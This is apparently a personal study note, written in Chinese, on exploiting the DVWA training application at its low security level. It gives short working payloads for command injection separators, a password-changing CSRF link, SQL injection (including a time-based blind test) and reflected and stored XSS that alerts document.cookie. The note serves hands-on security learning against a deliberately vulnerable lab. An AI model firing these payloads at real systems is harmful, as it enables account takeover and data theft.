# DVWA
## LOW
### Command injection
常見的指令:
1.;能夠直接執行第二個命令
2.&& 第一個指令成功後執行第二個
3.|| 第一個指令失敗後執行第二個
![[Pasted image 20220629200154.png]]
### CSRF
使用方式：
```
http://192.168.0.20/vulnerabilities/csrf/?password_new=asd&password_conf=asd&Change=Change#
```
此連結會將已登入中的帳號的密碼修改為'asd'
![[Pasted image 20220629201655.png]]
### File Inclusion
使用方式：
從路由中瀏覽包含在網頁中的檔案
！在DVWA中測試失敗可能是虛擬機問題
### SQL Injection
使用方式：
```
' or '1'='1
```
![[Pasted image 20220629205147.png]]
### SQL Injection (Blind)
使用方式：
```
1' and sleep(5)#
```
![[Pasted image 20220629205540.png]]
### XSS reflected
使用方法：
```
<script>alert('NML')</script>
```
![[Pasted image 20220629213830.png]]
### XSS stored
使用方法：
```
<script>alert(document.cookie)</script>
```
![[Pasted image 20220629214051.png]]